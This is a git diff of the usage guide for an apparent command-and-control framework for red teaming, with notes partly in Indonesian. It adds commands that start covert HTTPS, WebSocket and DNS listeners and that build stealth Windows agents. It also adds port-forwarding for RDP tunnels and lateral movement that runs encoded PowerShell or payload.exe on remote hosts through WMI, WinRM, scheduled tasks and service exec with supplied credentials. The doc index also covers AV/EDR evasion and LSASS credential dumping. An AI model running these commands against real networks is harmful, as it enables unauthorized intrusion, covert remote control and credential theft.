@@ -23,14 +23,15 @@
 | [11](11-evasion.md) | Evasion & Bypass | AMSI, ETW, unhook, sleep masking, HWBP, token |
 | [12](12-credentials.md) | Credential Access | LSASS, SAM, browser, clipboard |
 | [13](13-recon.md) | Reconnaissance | Screenshot, keylogger, token enumeration |
-| [14](14-network.md) | Network & Pivoting | Port scan, ARP scan, SOCKS5 proxy |
+| [14](14-network.md) | Network & Pivoting | Port scan, ARP scan, SOCKS5 proxy, Port forwarding |
 | [15](15-advanced.md) | Advanced Techniques | BOF, registry ops, OPSEC timegate, anti-analysis |
 | [16](16-scenarios.md) | Red Team Scenarios | Skenario engagement end-to-end |
 | [17](17-profiles.md) | Malleable Profiles | HTTP traffic camouflage (office365, cdn, slack) |
 | [18](18-opsec-hardening.md) | OPSEC Hardening | String encryption, Authenticode signing |
-| [19](19-advanced-transports.md) | Advanced Transports | DoH beacon, ICMP C2, SMB named pipe |
+| [19](19-advanced-transports.md) | Advanced Transports | WebSocket, DNS, DoH, ICMP, SMB, cert pinning |
 | [20](20-teamserver.md) | Team Server | Multi-operator, claiming, SSE event stream |
 | [21](21-opsec-playbook.md) | OPSEC Playbook | Operator playbook: initial intrusion → exfiltration |
+| [22](22-lateral-movement.md) | Lateral Movement | WMI, WinRM, Schtask, Service exec via agent pivot |
 
 ---
 
@@ -38,12 +39,38 @@
 
 ```bash
 # ─── SERVER ─────────────────────────────────────────────────────────────────
-ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8000
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8080
+
+# HTTPS built-in (self-signed cert otomatis)
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --port 8080 --tls-port 8443
+
+# HTTPS dengan cert custom
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --tls-cert server.crt --tls-key server.key --tls-port 443
+
+# HTTPS via env vars
+TLS_ENABLED=true TLS_PORT=8443 ENCRYPTION_KEY=K3yRah4sia ./bin/server
+
+# WebSocket listener (push commands, low latency)
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --ws --ws-port 8081
+
+# DNS authoritative listener (UDP, butuh --dns-domain)
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --dns --dns-domain c2.yourdomain.com --dns-port 5353
+
+# HTTPS + WS + DNS sekaligus
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --tls-port 8443 --ws --ws-port 8081 \
+  --dns --dns-domain c2.yourdomain.com
+
+# HTTPS + WS sekaligus
+ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --tls-port 8443 --ws --ws-port 8081
 
 # ─── BUILD AGENT ────────────────────────────────────────────────────────────
 make agent-win-stealth C2_SERVER=https://c2.corp.local:8000 ENC_KEY=K3yRah4sia INTERVAL=60 JITTER=25
+make agent-win-stealth C2_SERVER=https://IP:8443 ENC_KEY=K3yRah4sia CERT_PIN=aabb...  # TLS cert pinning
 make agent-win-doh     C2_SERVER=example.com ENC_KEY=K3yRah4sia TRANSPORT=doh
 make agent-win-smb     SMB_RELAY=10.10.5.3   ENC_KEY=K3yRah4sia TRANSPORT=smb
+make agent-win-ws      C2_SERVER=http://IP:8080 ENC_KEY=K3yRah4sia TRANSPORT=ws        # WS push, latensi <1s
+make agent-win-dns     C2_SERVER=http://IP:8080 ENC_KEY=K3yRah4sia TRANSPORT=dns \
+                       DNS_DOMAIN=c2.yourdomain.com DNS_SERVER=IP:5353                 # DNS covert channel
 
 # ─── OPERATOR CONSOLE ───────────────────────────────────────────────────────
 ./bin/operator console --server http://IP:8000
@@ -121,6 +148,23 @@ netscan  <id> --targets 192.168.1.0/24 --ports 22,80,443,3389 --scan-timeout 2 -
 arpscan  <id> --wait
 socks5 start <id> [--addr 127.0.0.1:1080] --wait
 socks5 stop  <id>
+
+# ─── PORT FORWARDING ─────────────────────────────────────────────────────────
+portfwd start <id> 192.168.1.10:3389 --local-port 33899   # buat tunnel RDP
+portfwd list                                               # lihat session aktif
+portfwd stop fwd-1                                         # hapus session
+# Setelah agent eksekusi (1 beacon interval):
+xfreerdp /v:localhost:33899 /u:CORP\\john.doe /p:'P@ss'
+
+# ─── LATERAL MOVEMENT ────────────────────────────────────────────────────────
+# WMI (fire-and-forget, tidak butuh WinRM)
+lateral wmi  <id> DC01   "cmd /c whoami > C:\Temp\o.txt" --user admin --domain CORP --pass 'P@ss'
+# WinRM (output di-capture, butuh PSRemoting enabled di target)
+lateral winrm <id> FS01  "hostname; net user" --user admin --domain CORP --pass 'P@ss' --wait
+# Scheduled Task remote (berguna jika WMI diblokir)
+lateral schtask <id> 192.168.1.50 "powershell -enc <B64>" --user admin --domain CORP --pass 'P@ss'
+# Service exec (seperti PsExec, paling noisy)
+lateral service <id> 192.168.1.100 "C:\Temp\payload.exe"
 
 # ─── REGISTRY ───────────────────────────────────────────────────────────────
 registry read   <id> --hive HKLM --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName --wait
